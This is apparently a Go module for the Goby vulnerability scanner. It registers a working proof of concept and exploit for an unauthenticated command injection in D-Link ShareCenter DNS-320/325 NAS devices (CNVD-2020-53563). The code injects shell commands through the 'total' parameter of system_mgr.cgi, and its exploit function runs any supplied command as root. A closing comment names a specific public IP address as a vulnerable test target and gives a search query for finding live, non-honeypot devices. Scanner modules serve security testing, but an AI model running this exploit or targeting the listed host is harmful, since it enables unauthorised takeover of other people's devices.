package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "DLink DNS ShareCenter RCE (CNVD-2020-53563)",
    "Description": "D-Link ShareCenter DNS-320 and DNS-325 allow remote command execute via shell metacharacters into the total field to the system_mgr.cgi. Unauthenticated attackers can contral the device throung remote command execute.",
    "Product": "DLink DNS ShareCenter",
    "Homepage": "http://sharecenter.dlink.com/",
    "DisclosureDate": "2021-06-17",
    "Author": "Bygosec",
    "GobyQuery": "product=\"DLink-DNS-ShareCenter\"",
    "Level": "3",
    "Impact": "<p>D-Link ShareCenter DNS-320 and DNS-325 allow remote command execute via shell metacharacters into the total field to the system_mgr.cgi. Unauthenticated attackers can contral the device throung remote command execute.</p>",
    "Recommendation": "<p>Update device firmware, and operate the devices behind a firewall.</p>",
    "References": [
        "https://www.cnvd.org.cn/flaw/show/CNVD-2020-53563"
    ],
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "id"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND"
    ],
    "ExploitSteps": null,
    "Tags": [
        "RCE"
    ],
    "CVNDIDs": [
        "CNVD-2020-53563"
    ],
    "CVSSScore": "0.0",
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "6820"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			//randomstr := goutils.RandomHexString(16)
			uri := "/cgi-bin/system_mgr.cgi?cmd=cgi_get_log_item&total=;id; HTTP/1.1"
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
			httpclient.SetDefaultProxy("http://127.0.0.1:8080")
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				return resp.StatusCode == 200 && strings.Contains(strings.Split(resp.Utf8Html, "\nContent-type: text/xml")[0], "uid=0(root) gid=0(root)")
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["cmd"].(string)
			uri := "/cgi-bin/system_mgr.cgi?cmd=cgi_get_log_item&total=;" + cmd + "; HTTP/1.1"
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				expResult.Output = strings.Split(resp.Utf8Html, "\nContent-type: text/xml")[0]
				expResult.Success = true
			}
			return expResult
		},
	))
}

//test vul url:https://179.215.238.180
//fofa query:(app="D_Link-DNS-ShareCenter") && (is_honeypot=false && is_fraud=false)
